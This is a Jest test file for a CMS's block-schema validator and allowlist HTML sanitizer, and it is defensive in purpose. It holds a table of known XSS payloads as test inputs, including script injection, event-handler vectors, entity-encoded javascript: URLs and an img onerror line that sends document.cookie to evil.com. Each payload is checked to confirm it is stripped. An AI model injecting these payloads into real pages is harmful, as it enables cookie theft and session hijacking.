import { BadRequestException, PayloadTooLargeException } from '@nestjs/common';
import { CMS_MAX_PAGE_BLOCKS_BYTES, CMS_MAX_RICH_TEXT_BYTES } from '@hrm/shared-types';
import { sanitizeCmsRichTextHtml } from './cms-sanitizer';
import { validateAndSanitizeCmsBlocks } from './cms-blocks.validator';

describe('CMS Block Model Schema & Server HTML Sanitizer', () => {
  describe('Block schema validation (all 11 block types)', () => {
    it('accepts valid instances of all supported block types and normalizes video embed URLs', () => {
      const blocks = validateAndSanitizeCmsBlocks([
        {
          id: 'blk-heading',
          type: 'heading',
          props: { level: 1, text: 'Deterministic Multi-Country Payroll', subtitle: 'Rule-versioned calculation engine' },
        },
        {
          id: 'blk-rich',
          type: 'rich_text',
          props: {
            html: '<h2>Overview</h2><p>Supports <strong>bold</strong>, <em>italic</em>, <code>v2026</code>, <blockquote>Quote</blockquote></p><ul><li>Item</li></ul><table><thead><tr><th scope="col">Col</th></tr></thead><tbody><tr><td>Val</td></tr></tbody></table><p><a href="https://example.com" target="_blank">Read more</a></p>',
          },
        },
        {
          id: 'blk-image',
          type: 'image',
          props: {
            mediaId: '10000000-0000-4000-8000-000000000001',
            alt: 'Payroll approval diagram showing review and lock workflow',
            caption: 'Locked payroll run workflow',
          },
        },
        {
          id: 'blk-btn',
          type: 'button',
          props: { label: 'Start free trial', href: '/signup', variant: 'primary' },
        },
        {
          id: 'blk-cards',
          type: 'feature_cards',
          props: {
            columns: 3,
            cards: [
              { title: 'Rule Resolver', description: '5-layer statutory fallback', linkHref: '/features/payroll', linkLabel: 'Explore' },
            ],
          },
        },
        {
          id: 'blk-faq',
          type: 'faq_list',
          props: { heading: 'Common Questions', category: 'pricing', limit: 5 },
        },
        {
          id: 'blk-cta',
          type: 'cta_band',
          props: {
            title: 'Ready to launch?',
            primaryButton: { label: 'Book demo', href: '/demo' },
            secondaryButton: { label: 'Contact sales', href: '/contact?topic=sales' },
          },
        },
        {
          id: 'blk-yt',
          type: 'video_embed',
          props: {
            provider: 'youtube',
            url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
            title: 'Payroll Walkthrough Video',
          },
        },
        {
          id: 'blk-vimeo',
          type: 'video_embed',
          props: {
            provider: 'vimeo',
            url: 'https://vimeo.com/123456789',
            title: 'Attendance Sync Demo',
          },
        },
        {
          id: 'blk-cols',
          type: 'columns',
          props: {
            ratio: '50-50',
            columns: [
              { blocks: [{ id: 'c1-txt', type: 'rich_text', props: { html: '<p>Column <b>one</b></p>' } }] },
              { blocks: [{ id: 'c2-btn', type: 'button', props: { label: 'Learn more', href: '/security' } }] },
            ],
          },
        },
        {
          id: 'blk-div',
          type: 'divider',
          props: { spacing: 'md' },
        },
        {
          id: 'blk-dyn',
          type: 'dynamic_block',
          props: { widget: 'pricing_table', heading: 'Live Plans' },
        },
      ]);

      expect(blocks).toHaveLength(12);
      const yt = blocks.find((b) => b.id === 'blk-yt');
      const vimeo = blocks.find((b) => b.id === 'blk-vimeo');
      expect(yt?.type === 'video_embed' && yt.props.url).toBe('https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ');
      expect(vimeo?.type === 'video_embed' && vimeo.props.url).toBe('https://player.vimeo.com/video/123456789');
      const rich = blocks.find((b) => b.id === 'blk-rich');
      expect(rich?.type === 'rich_text' && rich.props.html).toContain('rel="noopener noreferrer"');
    });

    it('enforces required alt text on image blocks', () => {
      expect(() =>
        validateAndSanitizeCmsBlocks([
          {
            id: 'img-no-alt',
            type: 'image',
            props: { mediaId: '10000000-0000-4000-8000-000000000001', alt: '   ' },
          },
        ]),
      ).toThrow(BadRequestException);
    });

    it('rejects disallowed video providers and non-allowlisted video URL patterns', () => {
      for (const badVideo of [
        { provider: 'youtube', url: 'https://evil.com/watch?v=dQw4w9WgXcQ', title: 'Bad host' },
        { provider: 'youtube', url: 'http://www.youtube.com/watch?v=dQw4w9WgXcQ', title: 'Non-HTTPS' },
        { provider: 'vimeo', url: 'https://vimeo.com/channels/staffpicks', title: 'Non-numeric Vimeo' },
        { provider: 'tiktok', url: 'https://tiktok.com/@user/video/1', title: 'Disallowed provider' },
        { provider: 'youtube', url: 'javascript:alert(1)', title: 'JS scheme' },
      ]) {
        expect(() =>
          validateAndSanitizeCmsBlocks([{ id: 'vid-bad', type: 'video_embed', props: badVideo }]),
        ).toThrow(BadRequestException);
      }
    });

    it('rejects dynamic_block payloads containing editable numeric/pricing fields', () => {
      for (const widget of ['pricing_table', 'country_list', 'plan_comparison'] as const) {
        expect(() =>
          validateAndSanitizeCmsBlocks([
            {
              id: `dyn-${widget}`,
              type: 'dynamic_block',
              props: { widget, monthlyPrice: 49, trialDays: 14 },
            },
          ]),
        ).toThrow(BadRequestException);
      }
    });

    it('rejects javascript: or data: URLs in button, cta_band, and feature_cards links', () => {
      expect(() =>
        validateAndSanitizeCmsBlocks([
          { id: 'btn-xss', type: 'button', props: { label: 'Click', href: 'javascript:alert(1)' } },
        ]),
      ).toThrow(BadRequestException);

      expect(() =>
        validateAndSanitizeCmsBlocks([
          {
            id: 'cta-xss',
            type: 'cta_band',
            props: { title: 'Hi', primaryButton: { label: 'Go', href: 'data:text/html,<script>1</script>' } },
          },
        ]),
      ).toThrow(BadRequestException);
    });

    it('rejects nested columns inside columns (prevents unbounded recursion)', () => {
      expect(() =>
        validateAndSanitizeCmsBlocks([
          {
            id: 'cols-nested',
            type: 'columns',
            props: {
              columns: [
                {
                  blocks: [
                    {
                      id: 'nested',
                      type: 'columns',
                      props: { columns: [{ blocks: [] }, { blocks: [] }] },
                    },
                  ],
                },
                { blocks: [] },
              ],
            },
          },
        ]),
      ).toThrow(BadRequestException);
    });
  });

  describe('Oversize content rejection', () => {
    it('rejects oversize rich-text HTML (>100 KB) before storage', () => {
      const oversizedHtml = `<p>${'a'.repeat(CMS_MAX_RICH_TEXT_BYTES + 10)}</p>`;
      expect(() => sanitizeCmsRichTextHtml(oversizedHtml)).toThrow(PayloadTooLargeException);
      expect(() =>
        validateAndSanitizeCmsBlocks([
          { id: 'big-rich', type: 'rich_text', props: { html: oversizedHtml } },
        ]),
      ).toThrow(PayloadTooLargeException);
    });

    it('rejects oversize total page blocks payload (>512 KB)', () => {
      const chunk = 'x'.repeat(60_000);
      const blocks = Array.from({ length: 10 }, (_, idx) => ({
        id: `b-${idx}`,
        type: 'rich_text',
        props: { html: `<p>${chunk}</p>` },
      }));
      expect(Buffer.byteLength(JSON.stringify(blocks), 'utf8')).toBeGreaterThan(
        CMS_MAX_PAGE_BLOCKS_BYTES,
      );
      expect(() => validateAndSanitizeCmsBlocks(blocks)).toThrow(PayloadTooLargeException);
    });
  });

  describe('Allowlist HTML sanitization against known XSS payloads', () => {
    const xssPayloads: Array<{ name: string; input: string; forbiddenPatterns: RegExp[] }> = [
      {
        name: 'script tag injection',
        input: '<p>Hello</p><script>alert("xss")</script>',
        forbiddenPatterns: [/<script/i, /alert\(/i],
      },
      {
        name: 'broken/nested script smuggling',
        input: '<<script>script>alert(1)</script>',
        forbiddenPatterns: [/<script/i],
      },
      {
        name: 'img onerror payload',
        input: '<p>Bio</p><img src="x" onerror="fetch(\'https://evil.com?c=\'+document.cookie)">',
        forbiddenPatterns: [/<img/i, /onerror/i, /document\.cookie/i],
      },
      {
        name: 'svg onload vector',
        input: '<svg onload="alert(1)"><circle r="10"/></svg><p>Safe</p>',
        forbiddenPatterns: [/<svg/i, /onload/i, /alert/i],
      },
      {
        name: 'inline event handlers on allowed tags',
        input: '<h2 onclick="alert(1)" onmouseover="steal()">Title</h2><p onfocus="xss()">Body</p>',
        forbiddenPatterns: [/onclick/i, /onmouseover/i, /onfocus/i],
      },
      {
        name: 'javascript: href on anchor tag',
        input: '<a href="javascript:alert(document.domain)">Malicious</a>',
        forbiddenPatterns: [/javascript:/i],
      },
      {
        name: 'mixed-case + whitespace + entity-encoded javascript URL smuggling',
        input: '<a href="&#x6a;Av&#x09;AsCrIpT:alert(1)">Smuggled</a><a href="JaVaScRiPt:alert(2)">Mix</a>',
        forbiddenPatterns: [/javascript:/i, /alert\(/i],
      },
      {
        name: 'data: and vbscript: URLs',
        input: '<a href="data:text/html,<script>alert(1)</script>">Data</a><a href="vbscript:msgbox(1)">VB</a>',
        forbiddenPatterns: [/data:/i, /vbscript:/i, /<script/i],
      },
      {
        name: 'style attribute CSS expression/url injection & <style> tags',
        input: '<style>body{background:url(javascript:alert(1))}</style><p style="color:red;background:url(x)">Text</p>',
        forbiddenPatterns: [/<style/i, /style=/i, /javascript:/i],
      },
      {
        name: 'disallowed arbitrary iframe & srcdoc attribute',
        input: '<iframe src="https://evil.example/phish" srcdoc="<script>alert(1)</script>"></iframe>',
        forbiddenPatterns: [/<iframe/i, /evil\.example/i, /srcdoc/i],
      },
      {
        name: 'noscript mutation XSS / math / object / unknown custom tags',
        input: '<noscript><img src=x onerror=alert(1)></noscript><math><mi>x</mi></math><object data="x"></object><custom-widget foo="bar">Text</custom-widget>',
        forbiddenPatterns: [/<noscript/i, /<math/i, /<object/i, /<custom-widget/i, /onerror/i],
      },
    ];

    it.each(xssPayloads)('strips XSS vector: $name', ({ input, forbiddenPatterns }) => {
      const cleaned = sanitizeCmsRichTextHtml(input);
      for (const re of forbiddenPatterns) {
        expect(cleaned).not.toMatch(re);
      }
    });

    it('preserves allowlisted semantic tags, underline, tables, links (forcing rel=noopener noreferrer), safe Media Library images, and allowlisted YouTube/Vimeo iframe', () => {
      const dirty = [
        '<h1 style="color:blue">Heading</h1>',
        '<p onclick="bad()">Paragraph with <strong>bold</strong>, <em>italic</em>, <u>underline</u>, and <code>inline()</code>.</p>',
        '<blockquote>Quote</blockquote>',
        '<ul><li>One</li><li>Two</li></ul>',
        '<table><thead><tr><th scope="col">Plan</th></tr></thead><tbody><tr><td>Starter</td></tr></tbody></table>',
        '<a href="https://cmsn-hr.example/pricing" target="_blank">Pricing</a>',
        '<img src="/api/v1/public/content/media/550e8400-e29b-41d4-a716-446655440000/file" alt="Dashboard preview" data-media-id="550e8400-e29b-41d4-a716-446655440000" width="800" height="450" onclick="alert(1)" style="border:0">',
        '<img src="/api/v1/public/content/media/550e8400-e29b-41d4-a716-446655440001/file" alt="">',
        '<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" title="Demo" onload="alert(1)" style="border:0"></iframe>',
        '<iframe src="https://evil.com/embed/123"></iframe>',
      ].join('');

      const result = validateAndSanitizeCmsBlocks([
        { id: 'xss-rich', type: 'rich_text', props: { html: dirty } },
      ]);

      expect(result).toHaveLength(1);
      const html = result[0].type === 'rich_text' ? result[0].props.html : '';
      expect(html).toContain('<h1>Heading</h1>');
      expect(html).toContain('<strong>bold</strong>');
      expect(html).toContain('<em>italic</em>');
      expect(html).toContain('<u>underline</u>');
      expect(html).toContain('<code>inline()</code>');
      expect(html).toContain('<blockquote>Quote</blockquote>');
      expect(html).toContain('<table><thead><tr><th scope="col">Plan</th></tr></thead>');
      expect(html).toContain('<a href="https://cmsn-hr.example/pricing" rel="noopener noreferrer" target="_blank">Pricing</a>');
      expect(html).toContain('src="/api/v1/public/content/media/550e8400-e29b-41d4-a716-446655440000/file"');
      expect(html).toContain('alt="Dashboard preview"');
      expect(html).not.toContain('550e8400-e29b-41d4-a716-446655440001');
      expect(html).toContain('src="https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ"');
      expect(html).not.toContain('evil.com');
      expect(html).not.toContain('onclick');
      expect(html).not.toContain('onload');
      expect(html).not.toContain('style=');
    });
  });
});
